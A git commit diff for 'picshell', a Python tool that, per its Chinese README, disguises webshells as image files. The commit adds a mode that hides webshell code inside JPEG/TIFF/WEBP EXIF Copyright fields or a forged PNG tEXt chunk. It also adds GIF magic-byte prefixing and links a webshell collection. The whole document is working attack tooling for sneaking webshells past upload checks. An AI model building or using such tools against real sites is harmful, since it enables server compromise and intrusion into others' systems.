2a742a4909e06c51989ee28b6b80fface1f1a851
Abyss-emmm <460042115@qq.com>
2020-04-24 13:30:22 +0800

    add --ext argument to insert webshell in the picture

--- README.md
+++ README.md
@@ -1,15 +1,24 @@
 # picshell
 基于Python3,用于拼接图片与shell，两种模式，一种是指定文件类型，另一种是指定图片文件
+## 安装说明
+```cmd
+pips install -r requirements.txt
+```
+
 ## 使用说明
 **-t**：指定文件类型，jpg,png,bmp任选一种
 
 **-i**：指定图片文件路径
 
-**-s**：指定shell文件路径
+**-s**：指定shell文件路径，若文件不存在，则认为输入内容为webshell
 
 **-o**：指定图马文件路径
 
+**--ext**：将webshell写入图片中，仅支持png,jpg,tiff,webp格式的图片
+
 `pic`文件夹内提供图片。
+
+可参考别人收集的[webshell](https://github.com/tennc/webshell)
 ### 指定文件类型
 ```cmd
 python3 picshell.py -t [jpg,png,bmp] -s <webshell> -o <new webshell>
@@ -17,4 +26,9 @@ python3 picshell.py -t [jpg,png,bmp] -s <webshell> -o <new webshell>
 ### 指定图片文件
 ```cmd
 python3 picshell.py -i <image> -s <webshell> -o <new webshell>
+```
+
+### webshell写入图片内部
+```cmd
+python3 picshell.py --ext -i <image> -s <webshell> -o <new webshell>
 ```
--- picshell.py
+++ picshell.py
@@ -1,13 +1,17 @@
 #encoding:utf-8
 
 import argparse
+import os
+import piexif
+from PIL import Image
+from struct import pack
+from binascii import crc32
 
-pictypes = {'jpg':b'\xff\xd8\xff\xe0\x00\x10JFIF\x00','png':b'\x89PNG\x0d\x0a\x1a\x0a','bmp':b'BM'}
+pictypes = {'jpg':b'\xff\xd8\xff\xe0\x00\x10JFIF\x00','png':b'\x89PNG\x0d\x0a\x1a\x0a','bmp':b'BM','gif':b'GIF89a'}
 
 def usetype(pictype,webshell,saveshell):
     data = pictypes[pictype]
-    with open(webshell,"rb") as f:
-        data = data + f.read()
+    data = data + webshell
     with open(saveshell,"wb") as f:
         f.write(data)
         print("saved in "+saveshell)
@@ -15,26 +19,79 @@ def usetype(pictype,webshell,saveshell):
 def usefile(pic,webshell,saveshell):
     with open(pic,"rb") as f:
         data = f.read()
-    with open(webshell,"rb") as f:
-        data = data + f.read()
+    data = data + webshell
     with open(saveshell,"wb") as f:
         f.write(data)
         print("saved in "+saveshell)
 
+def checkshell(webshell):
+    if os.path.isfile(webshell):
+        print("Webshell use file mode")
+        with open(webshell,"rb") as f:
+            data = f.read()
+        return data
+    else:
+        print("Webshell use data mode")
+        data = webshell.encode()
+        return data
+
+def useext(pic,webshell,saveshell):
+    exif_formats = ["TIFF","JPEG","WEBP"]
+    other_formats = ["PNG"]
+    pic_image = Image.open(pic)
+    if pic_image.format in exif_formats:
+        save_in_exif(pic_image,webshell,saveshell)
+        pic_image.close()
+        return
+    if pic_image.format in other_formats:
+        if pic_image.format == "PNG":
+            save_in_png(pic,webshell,saveshell)
+            return
+    print("--ext only support "+",".join(exif_formats+other_formats))
+    
+
+def save_in_exif(pic,webshell,saveshell):
+    exif_dict = {}
+    exif_dict['0th'] = {piexif.ImageIFD.Copyright:webshell}
+    exif_bytes = piexif.dump(exif_dict)
+    pic.save(saveshell,format = pic.format,exif=exif_bytes)
+    print("saved in "+saveshell)
+
+def save_in_png(pic,webshell,saveshell):
+    with open(pic,"rb") as f:
+        data = f.read()
+    pre_data = data[0:33]
+    end_data = data[33:]
+    length = len(webshell) + 4 # 4 is the length of 'asd\x00'
+    tEXt_data = b'tEXtasd\x00'+webshell
+    crc = pack(">I",crc32(tEXt_data) & 0xffffffff)
+    save_data = pre_data + pack(">I",length) + tEXt_data + crc + end_data
+    with open(saveshell,"wb") as f:
+        f.write(save_data)
+        print("saved in "+saveshell)
+
+
 def main():
     parser = argparse.ArgumentParser()
-    parser.add_argument("-t","--type",help="type of picture",choices=['jpg', 'png', 'bmp'])
-    parser.add_argument("-i","--image",help="filename of image")
+    parser.add_argument("-t","--type",help="type of picture",choices=['jpg', 'png', 'bmp','gif'])
+    parser.add_argument("-i","--image",help="filename of picture")
     parser.add_argument("-s","--shell",help="filename of webshell",required=True)
     parser.add_argument("-o","--output",help="filename of picshell",required=True)
+    parser.add_argument("--ext",help="insert data into picture",action='store_true')
     args = parser.parse_args()
-    if args.image == None and args.type == None:
+    if args.ext and args.image == None:
+        print("Need set --ext and -i")
+        exit()
+    elif not args.ext and args.type == None and  args.image == None:
         print("Need set -t or -i")
         exit()
     if args.type != None:
-        usetype(args.type,args.shell,args.output)
+        usetype(args.type,checkshell(args.shell),args.output)
     else:
-        usefile(args.image,args.shell,args.output)
+        if args.ext:
+            useext(args.image,checkshell(args.shell),args.output)
+        else:
+            usefile(args.image,checkshell(args.shell),args.output)
 
 if __name__ == "__main__":
     main()
